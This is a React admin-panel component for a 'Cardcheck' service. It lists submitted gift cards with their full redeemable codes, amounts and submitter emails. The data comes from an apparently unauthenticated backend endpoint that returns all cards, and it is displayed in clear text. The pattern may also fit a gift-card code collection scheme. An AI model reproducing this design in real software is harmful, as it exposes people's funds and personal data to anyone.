import React, { useEffect, useState } from "react";
import axios from "axios";
import "./Admin.css";

function Admin() {
  const [cards, setCards] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  const fetchCards = async () => {
    try {
      const response = await axios.get("https://cardcheckbackend.onrender.com/api/cards/all");
      setCards(response.data);
    } catch (err) {
      setError("Failed to load submissions. Check your connection and try again.");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchCards();
  }, []);

  const formatDate = (dateStr) => {
    const d = new Date(dateStr);
    return d.toLocaleDateString("en-US", {
      year: "numeric",
      month: "short",
      day: "numeric",
    });
  };

  return (
    <div className="admin-page">
      {/* Header */}
      <header className="admin-topbar">
        <div className="admin-brand">
          <span className="admin-brand__mark" aria-hidden="true">◇</span>
          <div>
            <p className="admin-brand__name">Cardcheck</p>
            <p className="admin-brand__role">Admin panel</p>
          </div>
        </div>
        <div className="admin-badge">
          {loading ? "—" : cards.length} submission{cards.length !== 1 ? "s" : ""}
        </div>
      </header>

      <main className="admin-main">
        <div className="admin-heading">
          <h1>Gift Card Requests</h1>
          <p>All submitted gift cards awaiting review</p>
        </div>

        {/* Loading */}
        {loading && (
          <div className="admin-state">
            <div className="spinner" aria-label="Loading" />
            <p>Loading submissions…</p>
          </div>
        )}

        {/* Error */}
        {!loading && error && (
          <div className="admin-state admin-state--error">
            <span className="admin-state__icon" aria-hidden="true">!</span>
            <p>{error}</p>
            <button className="retry-btn" onClick={fetchCards}>Retry</button>
          </div>
        )}

        {/* Empty */}
        {!loading && !error && cards.length === 0 && (
          <div className="admin-state admin-state--empty">
            <span className="admin-state__icon" aria-hidden="true">◇</span>
            <p>No submissions yet.</p>
          </div>
        )}

        {/* Table */}
        {!loading && !error && cards.length > 0 && (
          <div className="table-wrap">
            <table className="cards-table">
              <thead>
      <tr>
  <th>ID</th>
  <th>Card Type</th>
  <th>Card Code</th>
  <th>Amount</th>
  <th></th>
  <th>Date</th>
</tr>
              </thead>
              <tbody>
                {cards.map((card, idx) => (
                  <tr key={card.id}>
                    <td data-label="#">
                      <span className="row-index">{String(idx + 1).padStart(2, "0")}</span>
                    </td>
                    <td data-label="Card Type">
                      <span className="card-type-pill">{card.card_type}</span>
                    </td>
                    <td data-label="Card Code">
                      <code className="card-code">{card.card_code}</code>
                    </td>
                    <td data-label="Amount">
                      <span className="amount">${Number(card.amount).toLocaleString()}</span>
                    </td>
                    <td data-label="Email">
                      <span className="email">{card.email}</span>
                    </td>
                    <td data-label="Date">
                      <span className="date">{formatDate(card.created_at)}</span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </main>
    </div>
  );
}

export default Admin;